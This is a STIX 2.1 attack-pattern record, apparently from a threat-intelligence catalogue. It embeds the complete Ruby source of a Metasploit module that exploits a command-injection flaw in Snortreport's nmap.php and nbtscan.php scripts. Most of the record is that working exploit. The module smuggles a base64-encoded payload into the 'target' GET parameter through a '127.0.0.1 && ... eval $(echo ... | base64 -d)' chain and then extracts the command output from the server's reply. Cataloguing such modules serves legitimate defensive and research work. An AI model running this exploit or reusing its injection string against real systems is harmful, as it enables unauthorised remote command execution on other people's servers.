{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6850bf51-d39e-45b2-aa7c-c1b9dd41448d",
    "created": "2024-08-14T17:10:46.17723Z",
    "modified": "2024-08-14T17:10:46.177233Z",
    "name": "Snortreport nmap.php/nbtscan.php Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in nmap.php and nbtscan.php scripts.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/snortreport_exec.rb",
            "external_id": "snortreport_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.symmetrixtech.com/articles/news-016.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Snortreport nmap.php/nbtscan.php Remote Command Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability in\n        nmap.php and nbtscan.php scripts.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Paul Rascagneres'  #itrust consulting during hack.lu 2011\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '67739'],\n          ['URL', 'http://www.symmetrixtech.com/articles/news-016.html']\n        ],\n      'Payload'        =>\n      {\n        'Compat'     =>\n        {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'generic perl ruby telnet python',\n        }\n      },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2011-09-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to nmap.php or nbtscan.php\", \"/snortreport-1.3.2/nmap.php\"]),\n      ])\n  end\n\n  def exploit\n    base64_payload = Rex::Text.encode_base64(payload.encoded)\n\n    start = \"127.0.0.1 && echo XXXXX && eval $(echo \"\n    last  = \" | base64 -d) && echo ZZZZZ\"\n    custom_payload = start << base64_payload << last\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(datastore['URI']),\n      'vars_get'  =>\n      {\n        'target' => custom_payload\n      }\n    },10)\n\n    if (res)\n      to_print=false\n      already_print=false\n      part=res.body.gsub(\"<BR>\",\"\")\n      part.each_line do |line|\n        if line =~ /ZZZZZ/\n          to_print=false\n        end\n        if to_print == true\n          print(line)\n        end\n        if line =~ /XXXXX/\n          already_print=true\n          to_print=true\n        end\n      end\n\n      if already_print == false\n        print_error(\"This server may not be vulnerable\")\n      end\n    else\n      print_error(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-19",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}